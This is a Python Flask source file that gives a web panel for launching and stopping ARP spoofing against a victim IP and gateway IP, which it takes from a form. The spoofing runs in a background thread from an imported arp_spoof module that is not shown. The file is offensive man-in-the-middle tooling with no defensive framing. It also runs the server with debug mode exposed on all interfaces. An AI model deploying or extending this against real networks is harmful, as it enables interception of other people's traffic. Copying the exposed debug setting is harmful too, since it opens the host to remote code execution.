from flask import Flask, render_template, request, redirect, url_for
import threading
from arp_spoof import start_spoofing, stop

app = Flask(__name__)
spoofing_thread = None

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_spoof', methods=['POST'])
def start_spoof():
    global spoofing_thread
    victim_ip = request.form['victim_ip']
    gateway_ip = request.form['gateway_ip']
    
    # Start spoofing in a separate thread
    spoofing_thread = threading.Thread(target=start_spoofing, args=(victim_ip, gateway_ip))
    spoofing_thread.start()
    
    return render_template('index.html', message="ARP spoofing started.")

@app.route('/stop_spoof', methods=['POST'])
def stop_spoof():
    # Call the stop function from arp_spoof.py
    stop()
    
    # Wait for the spoofing thread to end
    if spoofing_thread is not None:
        spoofing_thread.join()
    
    return render_template('index.html', message="ARP spoofing stopped.")



if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5003, debug=True)
